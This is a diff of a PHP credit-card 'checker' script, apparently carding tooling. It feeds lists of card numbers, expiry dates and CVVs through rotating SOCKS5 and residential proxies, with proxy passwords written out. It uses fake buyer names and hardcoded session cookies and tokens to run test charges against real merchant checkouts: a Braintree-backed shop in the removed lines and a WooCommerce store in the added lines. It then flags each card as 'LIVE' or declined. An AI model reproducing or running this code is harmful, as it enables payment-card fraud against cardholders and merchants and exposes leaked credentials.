@@ -23,14 +23,6 @@ $cc = $separar[0];
 $mes = $separar[1];
 $ano = $separar[2];
 $cvv = $separar[3];
-$binn = substr($cc,0,6);
-
-
-if(strlen($mes<='09')){
-        $mes1=substr($mes,1,2);
-    } else {
-        $mes1=$mes;
-    }
 $cc1 = substr($cc,0,4);
 $cc2 = substr($cc,4,4);
 $cc3 = substr($cc,8,4);
@@ -38,6 +30,8 @@ $cc4 = substr($cc,12,4);
 $cc5 = substr($cc,0,4);
 $cc6 = substr($cc,4,6);
 $cc7 = substr($cc,10,5);
+$binn = substr($cc,0,6);
+
 
 
 if($cbin == "3"){
@@ -45,6 +39,13 @@ if($cbin == "3"){
 }else{
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
+
+
+if(strlen($mes<='09')){
+        $mes1=substr($mes,1,2);
+    } else {
+        $mes1=$mes;
+    }
 
 If(strlen($ano) > 2)
 {
@@ -104,183 +105,104 @@ function datosapellido(){
 
 
 function email($nombre){
-  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
+  $email = preg_replace('<\W+>', "", $apellido).rand(0000,9999)."@hotmail.com";
   return $email;
 }
+ function ibuuproxy(){
+  $proxySocks = file("Socks5.txt");
+   $myproxy = rand(0, sizeof($proxySocks)-1);
+   $proxySocks = $proxySocks[$myproxy];
+ return $proxySocks;
+}
+
 
 ///$cpf = cpf(1);
 $nombre = datosnombre();
 $apellido = datosapellido();
-// $email = email($nombre);
+$email = email($apellido);
 $zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
-$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
-$username = 'lum-customer-hl_6366aa06-zone-static_res';
-$password = 'a9by3kql965v';
+$username = 'lum-customer-hl_7873c611-zone-static_res';
+$password = 'p8txkzc6mq9h';
 $port = 22225;
 $session = mt_rand();
 $super_proxy = 'zproxy.lum-superproxy.io';
-
 $ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
 $city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);
 
-function ibuuproxy(){
-  $poxySocks = file("Socks5.txt");
-   $myproxy = rand(0, sizeof($poxySocks)-1);
-   $poxySocks = $poxySocks[$myproxy];
- return $poxySocks;
-}
 
-$poxySocks5 = ibuuproxy();
-
-$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
-$lname = 'Wang';
-$email1 = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
- // $email2 = $fname.rand(10,999).'@yopmail.com';
-// //$password = 'P@5%Word';
-// $password2 = 'Hansabhen1@';
-$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
-$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
-
-$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
+// echo $binn;
 
 
 
+$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);
 
 
+#req1==============================================================================
 
-
-
-curl_close($ch);
+// #==========================================================================================================
 
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
+curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+ // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+ // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: */*',
+'accept: application/json, text/javascript, */*; q=0.01',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTExODU5NDMsImp0aSI6ImJkYjI0NWExLTM0NWUtNGIyYS05NzBiLTMxZTI2MTY1ZjdmMiIsInN1YiI6InFtNHRxZDk0MnY3aG5oZGoiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InFtNHRxZDk0MnY3aG5oZGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJmbG93Ym94VVNEIn19.uo_ibfRSmtCM5jWJFQ6usfuPGwRzwbj96591nWwGyfUhnXUrjOg_q_rz6kz4KQ_3zu4SCobX4B3GfV_V_6bzjw',
-'braintree-version: 2018-05-10',
-'content-type: application/json',
-'origin: https://assets.braintreegateway.com',
-'referer: https://payments.braintree-api.com/',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fterms-conditions%2F; psn_atf=1; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2Fterms-conditions%2F; soundestID=20200604051035-nPxniPmTdgEUTSWodJEz5zzDcEo5Iz4gAMYbWy2E1S0bRSfZw; omnisendAnonymousID=hyu6KWe3OvqDLq-20200604051035; tk_ai=woo%3Asgq4Om40N6RjyAgKgNjR007z; woocommerce_items_in_cart=1; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=1c0dc94b433efd48e657c410e8def6ee%7C%7C1591420406%7C%7C1591416806%7C%7Cbc0c875de852379c7ea4606c4a12eac3; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fcheckout%2F; soundest-views=6; woocommerce_cart_hash=09ddd609069212de8db0c0daa9e818c3; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2F%3Fwc-ajax%3Dcheckout',
+'Host: www.artofhearing.com.au',
+'Origin: https://www.artofhearing.com.au',
+'Referer: https://www.artofhearing.com.au/checkout/',
 'user-agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e248ac38-a76f-48a0-a2a5-fb9da250c8ff"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10080","streetAddress":"661 STATE ST"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wc_pickup_store&shipping_pickup_stores=Armadale&shipping_by_store=&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=9df0bcb094&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
-
-$b_pago = curl_exec($ch);
-
-$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
-
- $exyear = trim(strip_tags(getstr($b_pago,'"ccexpiredate":"','"')));
- $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
- $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
- $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
- $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
-
-
-  // echo $b_pago;
-
-
-// echo $ccnum;
-// echo $mes1;
-// echo $ano;
-// echo $cvv;
-
-// // //////////////////////// START REQUEST 2 ////////////////////////
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://shop.flowbox.io/my-account/add-payment-method/');
-
-//////////////////////// PROXY CALLS ////////////////////////////
-//               REMOVE '//' FOR PROXIES TO WORK BELOW
-
-//////////////////////// PROXYSCRAPE
-// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-//////////////////////// WEBSHARE
-// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
-
-//////////////////////// MANUAL Proxy List
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
-
-//////////////////////// LUMINATI
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// End Proxy Calls
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded',
-'cookie: wp_lead_uid=aFf1ToFUvHbT7ekZHy5TisZf5Q6vfFEm4K4; inbound_referral_site=Direct Traffic; PHPSESSID=93j8i0950tkm5p4m7ok3bm1urh; tk_ai=woo%3AYiqd435u6S%2BsilM6nccG2OHu; wp_lead_id=51875; lead_data_expire=true; inbound_wpleads_first_name=Vincent; inbound_wpleads_last_name=Warner; inbound_wpleads_country_code=GB; inbound_wpleads_work_phone=05182641524; inbound_wpleads_email_address=pubgkittu%40gmail.com; inbound_wpleads_company_name=Freelancer; wp_lead_list=%7B%22ids%22%3A%5B107%2C106%2C99%5D%7D; wordpress_logged_in_4bdb882eaf8fe442bf6d602304ef35c9=vincent.warner%7C1591287089%7CLrCZosQGwJnsupQ63KtR6TCUk7bX9l2YDgY2Q29b8Kx%7Cfe74e9f21b206f2f1afa491e9d1cd90ecd67edacf6759ee24da03b01d4ea4337; lead_session=30',
-'origin: https://shop.flowbox.io',
-'referer: https://shop.flowbox.io/my-account/add-payment-method/',
-'user-agent: '.$browser.''
-));
-
-//////////////////////// START POST FILED 1 ////////////////////////
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%223e693b8dc422702ac34720b07530ab34%22%2C%22fraud_merchant_id%22%3Anull%7D&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fqm4tqd942v7hnhdj%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fqm4tqd942v7hnhdj%22%7D%2C%22merchantId%22%3A%22qm4tqd942v7hnhdj%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwMDI4NzM2Mi01NjQyLTRjYWEtYWRmMC05ODliYmU2YTliZGYiLCJpYXQiOjE1OTEwOTk1NDUsImV4cCI6MTU5MTEwNjc0NSwiaXNzIjoiNWM4YWExZjJhZGIxNTYyZTAwM2M4YTg0IiwiT3JnVW5pdElkIjoiNWM4YWExZjFhZGIxNTYyZTAwM2M4YTdlIn0.ybBkboGrKHukjZjM-Bx2Qr4woZLyl4r9GL6zitFRmRE%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Flowbox%22%2C%22clientId%22%3A%22AT9_4c6CdkXdct5R8OR2ZBHykjWBTit1QTo1FvlmCyrDTsr88rZyMJBxG70udZavExf2GcAkQuuzbud-%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fshop.flowbox.io%2Fprivacy_policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fshop.flowbox.io%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22flowboxUSD%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce=007060cacf&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
-
-// // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
 
 $result = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Error:'.curl_error($ch);
-}
-curl_close($ch);
-$message = trim(strip_tags(getstr($result,'<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">','</ul>')));
-// $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
-// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-// // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'Payment method successfully added')){
-// updatecart();
-    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-    }
-elseif(strpos($result,'Not Acceptable!')) {
+ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
+// // // // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));
 
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+// // // // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));
 
-  }
+// // // // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));
 
+
+ if(strpos($result,'"result":"success"')){
+    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+
+
+   }
+elseif(strpos($result,'Insufficient Funds')){
+  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+   }
 else {
 
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
 
-  }
-curl_close($curl);
+// updatecart();
+}
+
+curl_close($ch);
 ob_flush();
-     // echo $result;
-//echo $browser;
+   // echo $result;
+ // echo $c_pago;
 ?>
